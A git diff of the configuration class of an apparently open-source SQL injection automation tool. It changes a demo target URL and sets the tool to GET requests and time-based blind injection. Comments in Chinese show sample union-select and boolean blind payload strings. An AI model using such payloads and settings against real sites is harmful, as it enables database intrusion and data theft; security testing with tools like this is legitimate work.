@@ -44,7 +44,7 @@ class BaseConfig:
         self.version = "V0.8.0"
 
         # 目标url
-        self.url = 'http://demo.lorexxar.pw/post.php'
+        self.url = 'http://demo.lorexxar.pw/get.php'
         self.s = requests.Session()
 
         # 请求头参数
@@ -57,7 +57,7 @@ class BaseConfig:
             "GET",
             "POST"
         )
-        self.sqlirequest = SqliRequest[1]
+        self.sqlirequest = SqliRequest[0]
 
         # 注入方式 0为正常 1为盲注 2为时间盲注
         SqliMethod = (
@@ -65,13 +65,13 @@ class BaseConfig:
             "build",
             "time"
         )
-        self.sqlimethod = SqliMethod[1]
+        self.sqlimethod = SqliMethod[2]
 
         # 若注入方式为normal，你需要自定义解包函数, 提供两种方式，一种为find, 一种为bs4,解包函数在上面
 
         '''
         若注入方式为build盲注，则通过返回长度判断
-        永真条件的长度（盲注时需要使用）test类中test可跑，默认为0，可设置
+        永真条件的长度（盲注时需要使用），默认为0，可设置, 如果不设置会默认使用self.payload获取的返回长度为self.len
         '''
         self.len = 0
 
@@ -88,7 +88,7 @@ class BaseConfig:
 
         而testmethod则是选择使用那种测试，互相兼容可以同时跑
         '''
-        self.wtest = False
+        self.wtest = True
 
         self.testmethod = {
             "test": 0,
@@ -147,9 +147,12 @@ class BaseConfig:
         payload===>替换为指定payload===>自定义替换表===>请求===>开始注入
 
         若为normal注入，必须构造返回BSqlier的payload，并通过test模式修改解包函数直至可以获取返回值（必须以空格为分隔符，结尾必须只有一个词（结尾可以通过修改自定义替换表中的值来修改））
-        eg: self.payload = "padding' union all select 1,'BSqlier' #"
+        eg: self.payload = "padding' union all select 1,'Feigong' #"
 
         若为build注入，则为与、或条件构造，如果是与注入，padding必须为返回值的条件
+        eg: self.payload = "padding' && 2333 #"
+
+        若为time注入，则可以使用上面两种的任何一种，格式与其相符，同样，关键位置使用2333或者'Feigong'填充
         '''
         self.payload = "padding' && 2333 #"
 
@@ -158,8 +161,8 @@ class BaseConfig:
         self.requesetformat = "user=BSqlier&passwd=ddog123&submit=Log+In"
         self.requesetformat = {"user": "BSqlier", "password": "a"}
         '''
-        # self.requesetformat = "user=BSqlier&passwd=ddog123&submit=Log+In"
-        self.requesetformat = {"user": "BSqlier", "password": "a"}
+        self.requesetformat = "user=BSqlier&passwd=ddog123&submit=Log+In"
+        # self.requesetformat = {"user": "BSqlier", "password": "a"}
 
         '''
         配置自定义替换表,合理的替换表配置远远可以替换出想要的所有情况payload
@@ -173,4 +176,4 @@ class BaseConfig:
         '''
         初始化dealpayload类，传入self.sqlimethod，self.payload, self.requestformat, self.filter
         '''
-        self.dealpayload = DealPayload(self.sqlirequest, self.payload, self.requesetformat, self.filter)
+        self.dealpayload = DealPayload(self.sqlirequest, self.payload, self.requesetformat, self.filter, self.time)
